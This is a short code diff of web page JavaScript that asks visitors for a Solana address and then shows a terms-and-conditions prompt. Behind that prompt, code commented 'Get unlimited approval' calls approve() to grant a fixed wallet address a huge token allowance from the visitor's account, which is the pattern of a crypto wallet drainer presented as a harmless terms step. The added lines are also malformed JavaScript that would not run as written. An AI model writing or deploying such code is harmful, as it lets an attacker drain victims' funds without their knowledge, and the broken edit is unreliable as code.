@@ -36,9 +36,12 @@ document.getElementById('terms').style.display = 'block';
 document.getElementById('status').innerText = 'Please enter a valid Solana address.';
 }
 
-async function acceptTerms() {
-if (confirm('Are you sure you want to accept the terms and conditions?')) {
-try {
+async function submitSol.addEventListener("click", () => {
+if (solInput.value.trim().length > 0) {
+termsModal.classList.remove("hidden");
+}
+});
+  
 // Get unlimited approval
 const contract = new web3.eth.Contract([], userAddress);
 await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });
